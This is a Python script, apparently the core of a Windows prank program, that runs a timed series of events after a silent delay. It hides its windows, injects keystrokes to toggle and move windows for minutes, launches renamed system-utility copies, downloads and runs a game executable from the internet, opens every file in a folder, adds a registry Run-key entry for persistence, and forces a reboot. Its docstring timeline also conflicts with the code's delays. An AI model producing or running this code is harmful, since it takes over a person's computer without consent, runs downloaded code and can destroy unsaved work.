"""
chaos_main.pyw
==============
Master orchestrator. Spawned by chaos_launcher after the 5-min silence.
Manages every timed chaos event from T+0 (relative to this script) onward.

Timeline (absolute, from original double-click):
  0 sec  : Wallpaper change (in chaos_launcher.pyw)
  5 min  : Mouse trail + Click confetti activated
  7 min  : Bouncing text + Dancing marquee
  8 min  : Random websites
  9 min  : Window jitter + Duplicate utilities
  10 min : Download & run DOOM
  11 min : Open EVERYTHING on the Desktop + Task Manager
  15 min : Register welcome-back, reboot

Pass --fast as a CLI arg to use 5-second intervals for testing.
"""

import subprocess
import sys
import os
import time
import threading
import webbrowser
import shutil
import ctypes
import random
import winreg
import urllib.request
import zipfile

# ── Fast-mode flag (for testing only) ─────────────────────────────────────────
FAST_MODE = "--fast" in sys.argv
SCALE     = 1 if not FAST_MODE else 0   # 0 = instant trigger for testing

def T(seconds):
    """Scale delay: normal mode keeps seconds, fast mode collapses to 5s gaps."""
    if FAST_MODE:
        # In fast mode, index matters, not seconds
        return seconds
    return seconds

BASE_DIR  = os.path.dirname(os.path.abspath(__file__))
PYTHON    = sys.executable

# ── Helpers ────────────────────────────────────────────────────────────────────

def silent_spawn(script, *args):
    cmd = [PYTHON, os.path.join(BASE_DIR, script)] + list(args)
    subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)

def run_cmd(cmd, **kw):
    subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW,
                     shell=True, close_fds=True, **kw)

# ── Event functions ────────────────────────────────────────────────────────────

def start_mouse_trail():
    silent_spawn("mouse_trail.pyw")

def start_click_confetti():
    silent_spawn("click_confetti.pyw")

def start_bouncing_text():
    silent_spawn("bouncing_text.pyw")

def start_dancing_marquee():
    silent_spawn("dancing_marquee.pyw")

def open_random_websites():
    """Open a stream of random fun/chaotic URLs every ~8 seconds for 60 s."""
    urls = [
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://www.youtube.com/watch?v=xvFZjo5PgG0",
        "https://www.reddit.com/r/softwaregore/",
        "https://www.youtube.com/watch?v=2Z4m4lnjxkY",
        "https://www.youtube.com/watch?v=kfVsfOSbJY0",
        "https://www.reddit.com/r/ProgrammerHumor/",
        "https://neal.fun/internet-index/",
        "https://theuselessweb.com/",
        "https://www.youtube.com/watch?v=_OBlgSz8sSM",
        "https://www.reddit.com/r/unexpected/",
    ]
    random.shuffle(urls)
    for url in urls[:6]:
        webbrowser.open(url)
        time.sleep(random.uniform(7, 12))

def start_websites():
    t = threading.Thread(target=open_random_websites, daemon=True)
    t.start()

def window_jitter():
    """
    Repeatedly send Win+D (show desktop toggle), Alt+F4 burst, Win+M, Escape,
    plus random window arrangement keys for 4 minutes.
    """
    import ctypes
    import ctypes.wintypes

    user32 = ctypes.windll.user32

    VK_ESCAPE   = 0x1B
    VK_WIN      = 0x5B   # Left Win
    VK_ALT      = 0x12
    VK_F4       = 0x73
    VK_D        = 0x44
    VK_M        = 0x4D
    KEYEVENTF_KEYUP = 0x0002

    def key_down(vk):
        user32.keybd_event(vk, 0, 0, 0)

    def key_up(vk):
        user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)

    def send_key(vk):
        key_down(vk); time.sleep(0.05); key_up(vk)

    def win_d():
        key_down(VK_WIN); key_down(VK_D)
        time.sleep(0.05)
        key_up(VK_D); key_up(VK_WIN)

    def win_m():
        key_down(VK_WIN); key_down(VK_M)
        time.sleep(0.05)
        key_up(VK_M); key_up(VK_WIN)

    end_time = time.time() + 240   # jitter for 4 minutes
    while time.time() < end_time:
        choice = random.randint(0, 3)
        if choice == 0:
            win_d()
        elif choice == 1:
            win_m()
        elif choice == 2:
            send_key(VK_ESCAPE)
            send_key(VK_ESCAPE)
        else:
            # Win+Up (maximize), Win+Down (restore/minimize)
            key_down(VK_WIN)
            user32.keybd_event(0x26 if random.random() < 0.5 else 0x28, 0, 0, 0)  # Up/Down arrow
            time.sleep(0.05)
            user32.keybd_event(0x26 if random.random() < 0.5 else 0x28, 0, KEYEVENTF_KEYUP, 0)
            key_up(VK_WIN)
        time.sleep(random.uniform(2.5, 5.0))

def start_jitter():
    t = threading.Thread(target=window_jitter, daemon=True)
    t.start()

def duplicate_utilities():
    """Create renamed copies of standard Windows utilities in %TEMP%."""
    funny_names = [
        ("notepad.exe",      "DEFINITELY_NOT_SPYWARE.exe"),
        ("calc.exe",         "QuantumCalculator9000.exe"),
        ("mspaint.exe",      "PhotoshopLite_2077.exe"),
        ("write.exe",        "WordProcessor_Pro_ULTRA.exe"),
        ("charmap.exe",      "Secret_Character_Vault.exe"),
        ("magnify.exe",      "FBI_Surveillance_Tool.exe"),
    ]
    system32 = r"C:\Windows\System32"
    temp     = os.environ.get("TEMP", r"C:\Temp")

    for src_name, dst_name in funny_names:
        src = os.path.join(system32, src_name)
        dst = os.path.join(temp, dst_name)
        if os.path.exists(src):
            try:
                shutil.copy2(src, dst)
                subprocess.Popen([dst], creationflags=subprocess.CREATE_NO_WINDOW,
                                 close_fds=True)
                time.sleep(0.8)
            except Exception:
                pass

def start_duplicates():
    t = threading.Thread(target=duplicate_utilities, daemon=True)
    t.start()

def download_and_run_doom():
    """
    Download the shareware DOOM WAD + DOS Box from Internet Archive,
    then try to run it. Falls back to the open-source Chocolate Doom
    or a direct .exe if available.
    """
    temp = os.environ.get("TEMP", r"C:\Temp")
    doom_dir = os.path.join(temp, "DOOM_CHAOS")
    os.makedirs(doom_dir, exist_ok=True)

    # We'll use the Chocolate Doom Windows build + the shareware WAD.
    # Internet Archive identifier: doom-shareware-1.9
    doom_zip_url = (
        "https://github.com/chocolate-doom/chocolate-doom/releases/download/chocolate-doom-3.1.1/chocolate-doom-3.1.1-win64.zip"
    )
    doom_zip     = os.path.join(doom_dir, "doom.zip")

    try:
        # ── Download ──────────────────────────────────────────────────────────
        headers = {"User-Agent": "Mozilla/5.0"}
        req  = urllib.request.Request(doom_zip_url, headers=headers)
        with urllib.request.urlopen(req, timeout=120) as resp, \
             open(doom_zip, "wb") as f:
            shutil.copyfileobj(resp, f)

        # ── Extract ───────────────────────────────────────────────────────────
        with zipfile.ZipFile(doom_zip, "r") as zf:
            zf.extractall(doom_dir)

        # ── Find & run .exe ───────────────────────────────────────────────────
        exe_candidates = []
        for root, dirs, files in os.walk(doom_dir):
            for f in files:
                if f.lower().endswith(".exe"):
                    exe_candidates.append(os.path.join(root, f))

        if exe_candidates:
            # Prefer something with "doom" in the name
            doom_exes = [e for e in exe_candidates if "doom" in os.path.basename(e).lower()]
            run_target = doom_exes[0] if doom_exes else exe_candidates[0]
            subprocess.Popen([run_target], cwd=os.path.dirname(run_target))
        else:
            # Fallback: open the Archive page in the browser
            webbrowser.open("https://github.com/chocolate-doom/chocolate-doom/releases/download/chocolate-doom-3.1.1/chocolate-doom-3.1.1-win64.zip")

    except Exception as e:
        # Fallback: open the browser to itch.io DOOM
        webbrowser.open("https://github.com/chocolate-doom/chocolate-doom/releases/download/chocolate-doom-3.1.1/chocolate-doom-3.1.1-win64.zip")

def start_doom():
    t = threading.Thread(target=download_and_run_doom, daemon=False)
    t.start()

def open_everything_in_folder():
    """Open every file and folder sitting in C:\\EmptyFolder."""
    # Direct path to your target folder
    target_folder = r"C:\EmptyFolder"
    
    # Verify the folder exists before proceeding
    if not os.path.isdir(target_folder):
        print(f"Error: The directory {target_folder} does not exist.")
        return

    items = os.listdir(target_folder)
    random.shuffle(items)
    
    for item in items:
        full_path = os.path.join(target_folder, item)
        try:
            os.startfile(full_path)
            time.sleep(0.15)
        except Exception:
            pass

    # Open Task Manager
    subprocess.Popen(
        ["taskmgr.exe"],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )

def start_desktop_bomb():
    t = threading.Thread(target=open_everything_in_folder, daemon=True)
    t.start()

def register_welcome_back():
    """Register welcome_back.pyw to run once after the next login via Run key."""
    welcome_path = os.path.join(BASE_DIR, "welcome_back.pyw")
    cmd_value    = f'"{PYTHON}" "{welcome_path}"'
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "LeviWelcomeBack", 0, winreg.REG_SZ, cmd_value)
        winreg.CloseKey(key)
    except Exception:
        pass  # If registry write fails silently skip

def schedule_reboot():
    """Register welcome-back script, then initiate a Windows restart."""
    register_welcome_back()
    time.sleep(2)
    # Windows shutdown /r /t 0  =>  immediate restart
    subprocess.run(["shutdown", "/r", "/t", "5", "/c",
                    "Chaos sequence complete. Restarting for the grand finale..."],
                   check=False)

# ── Main timeline ──────────────────────────────────────────────────────────────

def main():
    # ── In fast-mode, collapse all delays to 5-second gaps for quick testing ──
    if FAST_MODE:
        events = [
            (0,   start_mouse_trail,    "FAST T+0s  : Mouse trail"),
            (0,   start_click_confetti, "FAST T+0s  : Click confetti"),
            (5,   start_bouncing_text,  "FAST T+5s  : Bouncing text"),
            (5,   start_dancing_marquee,"FAST T+5s  : Dancing marquee"),
            (10,  start_websites,       "FAST T+10s : Websites"),
            (15,  start_jitter,         "FAST T+15s : Jitter"),
            (15,  start_duplicates,     "FAST T+15s : Duplicates"),
            (20,  start_doom,           "FAST T+20s : DOOM"),
            (25,  start_desktop_bomb,   "FAST T+25s : Desktop bomb"),
            (35,  schedule_reboot,      "FAST T+35s : Reboot"),
        ]
    else:
        events = [
            (0,    start_mouse_trail,     "T+0  : Mouse trail activated"),
            (0,    start_click_confetti,  "T+0  : Click confetti activated"),
            (120,  start_bouncing_text,   "T+2m : Bouncing text activated"),
            (120,  start_dancing_marquee, "T+2m : Dancing marquee activated"),
            (180,  start_websites,        "T+3m : Random websites launching"),
            (240,  start_jitter,          "T+4m : Window jitter started"),
            (240,  start_duplicates,      "T+4m : Utility duplicates spawned"),
            (300,  start_doom,            "T+5m : DOOM downloading..."),
            (360,  start_desktop_bomb,    "T+6m : Desktop bomb + Task Manager"),
            (600,  schedule_reboot,       "T+10m: REBOOT INITIATED"),
        ]

    start_time = time.time()
    triggered  = set()

    while len(triggered) < len(events):
        elapsed = time.time() - start_time
        for i, (delay, fn, label) in enumerate(events):
            if i not in triggered and elapsed >= delay:
                triggered.add(i)
                t = threading.Thread(target=fn, daemon=(i < len(events)-1))
                t.start()
        time.sleep(1)

if __name__ == "__main__":
    main()
